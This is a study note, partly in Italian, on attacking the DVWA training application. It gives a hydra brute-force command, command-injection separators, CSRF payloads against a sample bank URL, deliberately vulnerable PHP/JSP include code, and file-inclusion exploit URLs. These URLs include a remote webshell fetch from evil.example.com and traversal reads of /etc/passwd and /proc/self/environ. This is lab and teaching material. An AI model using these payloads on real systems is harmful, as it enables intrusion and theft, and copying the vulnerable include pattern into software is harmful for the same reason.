# DVWA

> http://www.dvwa.co.uk/

Default credentials: admin/password

## Brute force

- retrieve a valid PHPSESSID (`$1`)

- launch:

	`$ hydra -l admin -P rockyou.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=low"`

	"RELATIVE PATH:PARAMETERS:FAILED LOGIN TEXT:REQUEST COOKIES"

## Command injection

- submit:

	`; CMD`

	`&& CMD`

	`& CMD`

	`| CMD`

## CSRF

Cross-Site Request Forgery forza l'utente a fare una richiesta malevola a un sito su cui è autenticato.
L'attacco ha come obiettivo le richieste che cambiano lo stato interno del server, non il furto di dati, infatti l'attaccante non ha modo di vedere la risposta alla richiesta malevola.
Si ha una vulnerabilità "stored CSRF" quando l'attaccante è in grado di rendere persistente l'attacco direttamente sul sito vulnerabile.
A tale scopo si memorizza un tag IMG o IFRAME in un campo che accetta HTML o si realizza un più complesso attacco di XSS.

Example (GET method):

	<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>

	or

	<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">



Example (POST method):

	<form action="<nowiki>http://bank.com/transfer.do</nowiki>" method="POST">
	<input type="hidden" name="acct" value="MARIA"/>
	<input type="hidden" name="amount" value="100000"/>
	<input type="submit" value="View my pictures"/>
	</form>

	or

	<body onload="document.forms[0].submit()">
	<form...>

	or

	<script>
	function put() {
		var x = new XMLHttpRequest();
		x.open("PUT","http://bank.com/transfer.do",true);
		x.setRequestHeader("Content-Type", "application/json"); 
		x.send(JSON.stringify({"acct":"BOB", "amount":100})); 
	}
	</script>
	<body onload="put()">

L'ultima richiesta **non** viene eseguita dai moderni browser grazie alla restrizione same-origin prolicy.
Questa funzionalità è abilitata di default, a meno che il server abiliti esplicitamente le richieste cross-origin da uno o più siti usando CORS con l'header `Access-Control-Allow-Origin: *`.

## File inclusion

Questa vulnerabilità si ha quando un'applicazione crea un path per codice eseguibile usando una variabile che è sotto il controllo dell'attaccante,
in un modo che gli permette di controllare quale file viene eseguito a run time.
Sfruttando una vulnerabilità di questo tipo permette una RCE sul server che esegue l'appicazione vulnerabile.

### Remote File Inclusion

L'applicazione scarica ed esegue un file remoto.

### Local File Inclusion

Come il RFI ma il file è già presente sul server.

#### PHP

Funzioni che includono un file per l'esecuzione sono `include` e `require`.
La direttiva `allow_url_fopen` o `allow_url_include` abilitata permette di usare una URL per scaricare un file remoto ed eseguirlo.
Anche se disabilitato è raggirabile con compressione (`zlib://`) o stream audio (`ogg://`) che non ispezionano il flag URL PHP interno.
Si possono sfruttare anche i wrapper PHP come `php://input`.

Codice vulnerabile

	<form method="get">
	   <select name="language">
	      <option value="english">English</option>
	      <option value="french">French</option>
	      ...
	   </select>
	   <input type="submit">
	</form>

	<?php
	   if ( isset( $_GET['language'] ) ) {
	      include( $_GET['language'] . '.php' );
	   }
	?>

Exploit

	/vulnerable.php?language=http://evil.example.com/webshell.txt?
	/vulnerable.php?language=C:\\ftp\\upload\\exploit
	/vulnerable.php?language=C:\\notes.txt%00
	/vulnerable.php?language=../../../../../etc/passwd%00
	/vulnerable.php?language=../../../../../proc/self/environ%00

#### JSP

JSP è vulnerabile a Null byte injection (`%00`)

Codice vulnerabile

	<%
	   String p = request.getParameter("p");
	   @include file="<%="includes/" + p +".jsp"%>"
	%>

Exploit

	/vulnerable.jsp?p=../../../../var/log/access.log%00

- send GET request:

	http://localhost/vulnerabilities/fi/?page=../../../../../etc/passwd

**TODO: approfondisci meglio** 

- https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601
- https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/

